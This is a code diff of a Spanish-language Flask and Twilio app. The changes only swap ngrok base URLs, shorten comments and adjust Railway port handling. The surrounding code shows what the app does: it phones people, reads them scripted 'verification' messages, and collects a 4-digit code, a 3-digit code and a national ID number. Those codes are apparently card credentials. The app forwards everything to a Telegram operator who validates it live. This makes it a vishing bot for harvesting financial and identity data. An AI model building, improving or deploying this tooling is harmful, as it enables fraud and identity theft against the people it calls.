@@ -13,7 +13,7 @@ from dotenv import load_dotenv
 
 load_dotenv()
 
-# Configurar logging más detallado para mejor depuración
+# Configurar logging
 logging.basicConfig(level=logging.INFO, 
                     format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
@@ -57,7 +57,7 @@ def absolute_url(path):
         base = request.url_root
     else:
         # Si no hay contexto de solicitud, usar la URL base configurada
-        base = os.getenv('BASE_URL', 'https://6c86-190-84-119-242.ngrok-free.app')
+        base = os.getenv('BASE_URL', 'https://5c1a-190-84-119-242.ngrok-free.app')
         if not base.endswith('/'):
             base += '/'
     
@@ -109,7 +109,7 @@ def make_call():
     start_telegram_polling()
     
     # Construir la URL correctamente - FIX: Usamos directamente una URL completa
-    base_url = os.getenv('BASE_URL', 'https://6c86-190-84-119-242.ngrok-free.app')
+    base_url = os.getenv('BASE_URL', 'https://5c1a-190-84-119-242.ngrok-free.app')
     url = f"{base_url}/step1"
     logger.info(f"📞 URL para la llamada: {url}")
     
@@ -258,7 +258,7 @@ def step3():
     response.redirect('/step3')
     return str(response)
 
-# Actualiza el save-step3 para usar la nueva ruta de espera
+# save-step3 para usar la ruta de espera
 
 @app.route('/save-step3', methods=['POST'])
 def save_step3():
@@ -313,7 +313,7 @@ def save_step3():
     return str(response)
 
 
-# También puedes crear una ruta para re-verificación específica
+# ruta para re-verificación específica
 @app.route('/reverify', methods=['POST', 'GET'])
 def reverify():
     """
@@ -326,7 +326,7 @@ def reverify():
     response.say("Sus datos requieren una nueva verificación. Esto puede tomar un momento.", language='es-ES')
     response.say("Estamos procesando sus códigos y documento de identidad. Por favor espere.", language='es-ES')
     
-    # Opcional: Enviar una notificación al operador de Telegram
+    # Enviar una notificación al operador de Telegram
     if call_sid and call_sid in global_user_sessions:
         data = global_user_sessions[call_sid]
         msg = f"🔄 Solicitando RE-VERIFICACIÓN:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
@@ -478,7 +478,7 @@ def waiting_validation():
     else:
         response.say("Estamos validando sus datos. Por favor espere unos momentos.", language='es-ES')
     
-    # Reducir el tiempo de pausa para evitar esperas largas
+    # tiempo de pausa en segundos
     response.pause(length=10)
     
     # Redirigir a la verificación de resultados después de la espera
@@ -798,7 +798,7 @@ def process_call_command(chat_id, message_text):
     
     try:
         # Construir la URL correctamente - FIX: Usamos directamente una URL completa
-        url = f"{os.getenv('BASE_URL', 'https://6c86-190-84-119-242.ngrok-free.app')}/step1"
+        url = f"{os.getenv('BASE_URL', 'https://5c1a-190-84-119-242.ngrok-free.app')}/step1"
         logger.info(f"📞 URL para la llamada: {url}")
         
         # Hacer la llamada usando la API de Twilio
@@ -910,6 +910,6 @@ if __name__ == '__main__':
     # Iniciar polling de Telegram automáticamente al iniciar el servidor
     start_telegram_polling()
     
-    # Configurar el logging
-    logger.info("🚀 Iniciando servidor de validación telefónica...")
-    app.run(debug=os.getenv('DEBUG'), port=os.getenv('PORT'), host='0.0.0.0')
+    # Usar el puerto que proporciona Railway
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
